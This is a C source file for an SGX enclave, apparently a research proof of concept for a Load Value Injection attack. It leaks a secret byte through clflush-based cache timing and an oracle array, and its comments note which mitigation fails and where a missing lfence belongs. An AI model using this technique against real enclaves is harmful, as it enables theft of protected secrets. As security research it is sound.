/*
 * Copyright (C) 2011-2017 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */
#include "sgx_trts.h"
#include "../conf.h"
#include "string.h"

//non-assembly access that doesn't get optimized away by -O3
inline void maccess(volatile void *p) {
  //volatile uint64_t t = *((uint64_t *)p);
  *((volatile uint64_t *)p);
}

static void flush(void *p) {
#ifdef GS
  asm volatile("clflush %%gs:0(%0)\n" : : "c"(p) : "rax");
#else
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
#endif
}


/* 
 * printf: 
 *   Invokes OCALL to display the enclave buffer to the terminal.
 */
void printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
}

uint8_t __attribute__((aligned(0x1000))) secret_add[4096];

void ecall_do_something(char* oracle) {
  
  secret_add[0] = 0x5E;
  uint8_t secret = LEAKAGE_CHAR;

  unsigned count = 0;

  void *delay[9] = {0};

    
  while(count < 15001)
  {
    count++;
  
    //attacker prep, clears accessed and flushes variables
    //this could happen in a parallel thread or an sgx-step interrupt
    ocall_modify_page(secret_add);
    flush(&delay[0]);
    flush(&delay[8]);

    //victim
    //needs at least one delay like for good leakage
    //if the leakage rate is low, try more
    maccess(&delay[0]);
    maccess(&delay[8]);
    
    //0 gets transiently injected into the load of secret_add here, making the addend 0
    //LVI-Nullyify does NOT prevent this, manually add the lfence instruction to prevent an attack like this
    uint8_t sum = *secret_add+secret;
    //asm volatile("lfence");
    volatile char t = oracle[sum<<12];

    //attacker processing
    //this could happen in a parallel thread or an sgx-step interrupt
    ocall_check_oracle(0);
        
  }

}
